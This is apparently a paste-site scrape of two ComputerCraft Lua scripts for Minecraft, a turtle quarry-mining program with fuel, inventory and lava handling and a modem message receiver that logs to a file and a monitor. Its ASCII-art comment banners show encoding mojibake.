os.loadAPI(""dig.lua"")
dig.doBlacklist() -- Avoid Protected Blocks
dig.doAttack() -- Attack entities that block the way
dig.setFuelSlot(1)
dig.setBlockSlot(2)
local world_height = 384


local args = {...}
if #args == 0 then
 flex.printColors(
   ""quarry <length> [width] [depth]\n""..
   ""[skip <layers>] [dump] [nolava] [nether]"",
   colors.lightBlue)
 return
end --if


local reloaded = false
if dig.saveExists() then
 reloaded = true
 dig.loadCoords()
end --if
dig.makeStartup(""quarry"",args)


local zmax = tonumber(args[1])
local xmax = tonumber(args[2]) or zmax
local depth = world_height-1
if tonumber(args[2]) ~= nil then
 depth = tonumber(args[3]) or depth
end --if
local ymin = -depth --(1-depth)

if xmax == nil or zmax == nil then
 flex.send(""Invalid dimensions,"",colors.red)
 shell.run(""rm startup.lua"")
 return
end --if


local x
local skip = 0
local lava = true
local dodumps = false

for x=1,#args do
 
 if args[x] == ""dump"" then
  dodumps = true
 elseif args[x] == ""nolava"" then
  lava = false
 elseif args[x] == ""nether"" then
  dig.setBlockStacks(4)
 end --if
 
 if args[x] == ""skip"" then
  skip = tonumber(args[x+1])
  if skip == nil then
   flex.printColors(""Please specify skip depth"",
     colors.red)
   dig.saveClear()
   return
  end --if
  if dig.getymin() > -skip then
   dig.setymin(-skip)
  end --if
 end --if
 
end --for


if not lava then -- Block lava around edges of quarry
 dig.setBlockSlot(0)
 -- Always keep a stack of blocks
end --if




----------------------------------------------
-- |¬Ø¬Ø]||¬†|||\¬†||¬†/¬Ø][¬Ø¬Ø][¬Ø¬Ø]¬†/¬Ø\¬†|\¬†||/¬Ø¬Ø\¬†--
-- |¬†]¬†||_|||¬†\¬†||¬†[¬†¬†||¬†¬†][¬†|¬†O¬†||¬†\¬†|\_¬Ø\¬†--
-- ||¬†¬†¬†\__|||¬†\|¬†\_]¬†||¬†[__]¬†\_/¬†||¬†\|\__/¬†--
----------------------------------------------

local location
local function gotoBase()
 local x = dig.getxlast()
 location = dig.location()
 if dig.gety() < -skip then dig.up() end
 dig.gotox(0)
 dig.gotoz(0)
 dig.gotor(180)
 dig.gotoy(0)
 dig.gotox(0)
 dig.setxlast(x)
 dig.gotoz(0)
 dig.gotor(180)
 return location
end --function

local function returnFromBase(loc)
 local loc = loc or location
 local x = dig.getxlast()
 dig.gotor(0)
 checkFuel()
 dig.gotoy(math.min(loc[2]+1,-skip))
 checkFuel()
 dig.gotoz(loc[3])
 checkFuel()
 dig.gotox(loc[1])
 dig.setxlast(x) -- Important for restoring
 checkFuel()
 dig.gotor(loc[4])
 checkFuel()
 dig.gotoy(loc[2])
end --function



local function checkHalt()
 if not rs.getInput(""top"") then
  return
 end --if
 if dig.gety() == 0 then
  return
 end --if
 
 local loc,x
 -- Manual halt; redstone signal from above
 flex.send(""Manual halt initiated"", colors.orange)
 flex.printColors(""Press ENTER to resume mining\n""
   ..""or SPACE to return to base"",
   colors.pink)
 
 while true do
  x = flex.getKey()
  if x == keys.enter then return end
  if x == keys.space then break end
 end --while
 
 flex.send(""Returning to base"", colors.yellow)
 loc = gotoBase()
 print("" "")
 flex.printColors(""Press ENTER to resume mining"",
   colors.pink)
 while flex.getKey() ~= keys.enter do
  sleep(1)
 end --while
 
 if dodumps then dig.doDumpDown() end
 dig.dropNotFuel()
 flex.send(""Resuming quarry"",colors.yellow)
 returnFromBase(loc)
 
end --function



local function checkInv()
 if turtle.getItemCount(16) > 0 then
  
  if dodumps then
   dig.right(2)
   dig.doDump()
   dig.left(2)
  end --if
  
  if turtle.getItemCount(14) > 0 then
   local loc = gotoBase()
   dig.dropNotFuel()
   returnFromBase(loc)
  end --if
  
 end --if
end --function



function checkFuel()
 local a = turtle.getFuelLevel()
 local b = ( zmax + xmax + depth + 1 )*2
 local c = true
 
 while a < b and c do
  for x=1,16 do
   turtle.select(x)
   if turtle.refuel(1) then
    break
   end --if
   if x == 16 then
    c = false
   end --if
  end --for
  a = turtle.getFuelLevel()
 end --while
 
 if a < b then
  flex.send(""Fuel low, returning to surface"",
    colors.yellow)
  local loc = gotoBase()
  turtle.select(1)
  if dodumps then dig.doDumpDown() end
  while turtle.suckUp() do sleep(0) end
  dig.dropNotFuel()
  dig.refuel(b)
  flex.send(""Fuel aquired!"",colors.lightBlue)
  returnFromBase(loc)
 end --if
end --function



local dug = dig.getdug()
local ydeep = dig.getymin()
local function checkProgress()
 a = 1000 --report every <a> blocks dug
 b = 5 --report every <b> meters descended
 if math.floor(dug/a) < math.floor(dig.getdug()/a) then
  flex.send(""Dug ""..tostring(dig.getdug())..
    "" blocks"",colors.lightBlue)
 end --if
 if math.floor(-ydeep/b) < math.floor(-dig.gety()/b) then
  flex.send(""Descended ""..tostring(-dig.gety())..
    ""m"",colors.green)
 end --if
 dug = dig.getdug()
 ydeep = dig.gety()
end --function



local newlayer = false
function checkNewLayer()
 if newlayer then
  -- This encodes whether or not the turtle has
  --  started a new layer if at the edge
  dig.setr(dig.getr() % 360 + 360)
 else
  dig.setr(dig.getr() % 360)
 end --if
end --function



function lavax()
  if dig.getx() == 0 then
   dig.gotor(270)
   checkNewLayer()
   dig.blockLava()
  elseif dig.getx() == xmax-1 then
   dig.gotor(90)
   checkNewLayer()
   dig.blockLava()
  end --if/else
end --function

function lavaz()
  if dig.getz() == 0 then
   dig.gotor(180)
   checkNewLayer()
   dig.blockLava()
  elseif dig.getz() == zmax-1 then
   dig.gotor(0)
   checkNewLayer()
   dig.blockLava()
  end --if/else
end --function

function checkLava(n)
 if lava then
  local x
  local r = dig.getr() % 360
  
  if r == 0 or r == 180 then
   lavaz()
   lavax()
  else
   lavax()
   lavaz()
  end --if/else
  
  if dig.gety() == -skip then
   dig.blockLavaUp()
  end --if
  
  if dig.getx() == 0 and dig.getz() == 0
     and dig.gety() > -skip then
   for x=1,4 do
    dig.blockLava()
    dig.left()
    checkNewLayer()
   end --for
  end --if
  
  if n ~= 0 then
   dig.gotor(r)
   checkNewLayer()
  end --if
  
 end --if
end --function



function checkAll(n)
 checkNewLayer()
 checkProgress()
 checkFuel()
 checkInv()
 checkHalt()
 checkLava(n)
 dig.checkBlocks()
 checkNewLayer()
end --function




---------------------------------------
-- ¬†  ¬†¬†|\/|¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|\¬†||¬†        --
--¬†¬†   ¬†|¬†¬†|¬†|¬†¬†|¬†¬†][¬†¬†|¬†\¬†|¬†        --
--¬†¬†  ¬† ||||¬†||||¬†[__]¬†||¬†\|¬†        --
---------------------------------------
-- |¬Ø\¬†|¬Ø\¬†¬†/¬Ø\¬†¬†¬†/¬Ø¬Ø]¬†|¬Ø\¬†¬†/\¬†¬†|\/|¬†--
-- |¬†/¬†|¬†/¬†|¬†O¬†|¬†|¬†[¬Ø|¬†|¬†/¬†|¬†¬†|¬†|¬†¬†|¬†--
-- ||¬†¬†|¬†\¬†¬†\_/¬†¬†¬†\__|¬†|¬†\¬†||||¬†||||¬†--
---------------------------------------

local a,b,c,x,y,z,r,loc
local xdir, zdir = 1, 1

turtle.select(1)
if reloaded then
 
 flex.send(""Resuming ""..tostring(zmax)..""x""
   ..tostring(xmax).."" quarry"",colors.yellow)
 
 if dig.gety()==dig.getymin() and dig.gety()~=0 then
  zdir = dig.getzlast()
  if zdir == 0 then zdir = 1 end
  xdir = dig.getxlast()
  if xdir == 0 then xdir = 1 end
  
  if dig.getr() >= 360 then
   -- This encodes whether or not the turtle has
   --  started a new layer if at the edge
   xdir = -xdir
   newlayer = true
  end --if
  
 else
  gotoBase()
  if dodumps then dig.doDumpDown() end
  dig.dropNotFuel()
  dig.gotor(0)
  checkFuel()
  dig.gotoy(dig.getymin())
 end --if
 
else
 
 flex.send(""Starting ""..tostring(zmax)..""x""
   ..tostring(xmax).."" quarry"",colors.yellow)
 
 if skip > 0 then
  flex.send(""Skipping ""..tostring(skip)
    ..""m"", colors.lightGray)
 end --if
 
 if depth < world_height-1 then
  flex.send(""Going ""..tostring(-ymin)
    ..""m deep"", colors.lightGray)
 else
  flex.send(""To bedrock!"",colors.lightGray)
 end --if/else
 
end --if/else


while dig.gety() > -skip do
 checkFuel()
 dig.down()
 
 if dig.isStuck() then
  flex.send(""Co-ordinates lost! Shutting down"",
    colors.red)
  --rs.delete(""startup.lua"")
  return
 end --if
 
end --while



--------------------------
-- |\/|¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|\¬†||¬†--
-- |¬†¬†|¬†|¬†¬†|¬†¬†][¬†¬†|¬†\¬†|¬†--
-- ||||¬†||||¬†[__]¬†||¬†\|¬†--
--------------------------
-- ||¬†¬†¬†¬†/¬Ø\¬†¬†¬†/¬Ø\¬†¬†|¬Ø\¬†--
-- ||_¬†¬†|¬†O¬†|¬†|¬†O¬†|¬†|¬†/¬†--
-- |__]¬†¬†\_/¬†¬†¬†\_/¬†¬†||¬†¬†--
--------------------------

local done = false
while not done and not dig.isStuck() do
 turtle.select(1)
 
 while not done do
  
  checkAll(0)
  if dig.getz()<=0 and zdir==-1 then break end
  if dig.getz()>=zmax-1 and zdir==1 then break end
  
  if zdir == 1 then dig.gotor(0)
  elseif zdir == -1 then dig.gotor(180)
  end --if/else
  checkNewLayer()
  
  dig.fwd()
  
  if dig.isStuck() then
   done = true
  end --if
  
 end --while (z loop)
 
 if done then break end
 
 zdir = -zdir
 newlayer = false
 
 if dig.getx()<=0 and xdir==-1 then
  newlayer = true
 elseif dig.getx()>=xmax-1 and xdir==1 then
  newlayer = true
 else
  checkAll(0)
  dig.gotox(dig.getx()+xdir)
 end --if/else
 
 if newlayer and not dig.isStuck() then
  xdir = -xdir
  if dig.getymin() <= ymin then break end
  checkAll(0)
  dig.down()
 end --if
 
end --while (cuboid dig loop)


flex.send(""Digging completed, returning to surface"",
  colors.yellow)
gotoBase()

flex.send(""Descended ""..tostring(-dig.getymin())..
    ""m total"",colors.green)
flex.send(""Dug ""..tostring(dig.getdug())..
    "" blocks total"",colors.lightBlue)

for x=1,16 do
 if dig.isBuildingBlock(x) then
  turtle.select(x)
  dig.placeDown()
  break
 end --if
end --for
turtle.select(1)

if dodumps then
 dig.gotor(0)
 dig.doDump()
 dig.gotor(180)
end
dig.dropNotFuel()
dig.gotor(0)

dig.clearSave()
flex.modemOff()
os.unloadAPI(""dig.lua"")
os.unloadAPI(""flex.lua"")
"
QAfrhU7E,receive.lua,Cwackers,Lua,Sunday 26th of May 2024 12:42:33 PM CDT,"-- Cloned
-- Program to receive messages from computers/
-- turtles using flex.lua ""send"" function
-- <Flexico64@gmail.com>

--------------------------------------
-- |¬Ø\|¬Ø¬Ø]¬†/¬Ø]|¬Ø¬Ø][¬Ø¬Ø]\\  //|¬Ø¬Ø]|¬Ø\¬†--
-- |¬†/|¬†]¬†|¬†[¬†|¬†]¬†¬†][¬†¬†\\//¬†|¬†]¬†| /¬†--
-- |¬†\|__]¬†\_]|__][__]¬†¬†\/¬†¬†|__]| \¬†--
--------------------------------------

local log_file = ""log.txt""
local options_file = ""flex_options.cfg""
os.loadAPI(""flex.lua"")
local modem_channel = 6464


if fs.exists(options_file) then
 local file = fs.open(""flex_options.cfg"", ""r"")
 local line = file.readLine()
 while line ~= nil do
  if string.find(line, ""modem_channel="") == 1 then
   modem_channel = tonumber( string.sub(
         line, 15, string.len(line) ) )
   break
  end --if
  line = file.readLine()
 end --while
 file.close()
end --if


local modem
local p = flex.getPeripheral(""modem"")
if #p > 0 then
 modem = peripheral.wrap(p[1])
 modem.open(modem_channel)
else
 flex.printColors(""Please attach a wireless""
   .."" or ender modem\n"", colors.red)
 sleep(2)
 return
end --if/else

local monitor
p = flex.getPeripheral(""monitor"")
if #p > 0 then
 monitor = peripheral.wrap(p[1])
 term.redirect(monitor)
 monitor.clear()
 monitor.setCursorPos(1,1)
 monitor.setTextScale(0.5)
end --if
local lcd_x,lcd_y = monitor.getSize()


local file, line
local filelist = {}
if fs.exists(log_file) then
 file = fs.open(log_file, ""r"")
 line = file.readLine()
 
 while line ~= nil do
 
  if line ~= """" or ( line == """" and
     filelist[#filelist] ~= """" ) then
   filelist[#filelist+1] = line
  end --if
  
  line = file.readLine()
 end --while
 file.close()
 file = fs.open(log_file, ""a"")
 
else
 -- Log file does not exist: make one!
 file = fs.open(log_file, ""w"")
 
end --if/else


local x, y
y = math.max(1,#filelist-lcd_y)
for x=y, #filelist do
 flex.printColors(filelist[x])
end --for

if filelist[#filelist] ~= """" then
 file.writeLine("""")
end --if
file.close()


term.setTextColor(colors.white)
print(""Waiting for message on channel ""
      ..tostring(modem_channel)..""..."")

while true do
 local event, modemSide, senderChannel,
    replyChannel, message, senderDistance =
    os.pullEvent(""modem_message"")
 
 file = fs.open(log_file, ""a"")
 file.writeLine(message)
 file.close()
 
 flex.printColors(message)
 
 sleep(0.01)
end --while

"
